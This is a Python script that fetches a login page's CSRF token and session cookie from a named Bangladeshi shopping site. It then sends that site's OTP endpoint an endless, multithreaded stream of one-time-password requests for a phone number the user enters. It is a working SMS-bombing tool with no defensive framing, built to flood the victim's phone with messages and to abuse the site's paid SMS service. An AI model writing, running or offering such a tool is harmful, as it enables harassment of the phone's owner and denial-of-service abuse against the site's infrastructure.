import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Base URL and endpoints
base_url = "https://www.piarabazar.com.bd"
login_url = f"{base_url}/users/login"
otp_url = f"{base_url}/users/get-otp"

# Total requests counter
total_requests = 0

def fetch_csrf_and_session():
    """Fetch session ID and hidden CSRF token."""
    session = requests.Session()
    response = session.get(login_url)

    # Extract cookies
    cookies = response.cookies.get_dict()
    session_id = cookies.get('piara_bazar_bd_session')

    # Extract hidden CSRF token
    soup = BeautifulSoup(response.text, "html.parser")
    hidden_token = soup.find("input", {"name": "_token"})['value'] if soup.find("input", {"name": "_token"}) else None

    if not hidden_token or not session_id:
        raise Exception("Error: Could not retrieve CSRF token or session cookie.")

    return session, session_id, hidden_token

def send_request(session, hidden_token, mobile):
    """Send a single OTP request."""
    global total_requests
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 220333QBI Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36"
    }

    otp_data = {
        "_token": hidden_token,
        "phone": mobile,
        "country_code": "88",
        "email": "",
        "remember": "on"
    }

    try:
        response = session.post(otp_url, headers=headers, data=otp_data)
        if response.status_code == 200:
            total_requests += 1
            print(f"[Piyara_api] [{total_requests}] : {response.status_code}")
        else:
            print(f"Request failed: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main(mobile, threads):
    """Main function to run API requests."""
    try:
        session, session_id, hidden_token = fetch_csrf_and_session()
    except Exception as e:
        print(e)
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request, session, hidden_token, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

# To make this file executable standalone
if __name__ == "__main__":
    mobile = input("Enter mobile number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)